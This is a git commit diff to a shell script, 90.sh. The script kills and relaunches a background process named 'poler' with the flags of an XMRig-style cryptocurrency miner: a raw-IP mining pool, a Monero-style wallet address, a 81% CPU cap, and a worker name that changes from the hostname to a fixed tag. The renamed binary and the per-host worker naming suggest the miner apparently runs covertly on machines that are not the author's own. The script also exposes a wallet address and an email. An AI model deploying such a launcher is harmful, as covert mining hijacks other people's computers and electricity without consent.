9ea23efa4c9a4f7e58cd5d379d12991806ea5722
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-05-04 08:33:25 +0300

    worker names upd

--- 90.sh
+++ 90.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 81 --cpu-priority 3 -o 109.234.38.179:6002 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass="$(hostname)":lyashko6666@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 81 --cpu-priority 3 -o 109.234.38.179:6002 -u 43d7tDnkhtSTX6v1JkpHnjae26tM7kCdDBZFys9zwVAdMwo3dcLyKYP67DjymbW2hc9Hz1fREGKw334YrBBka4MWHHunmiv --pass=t4:lyashko6666@gmail.com -k
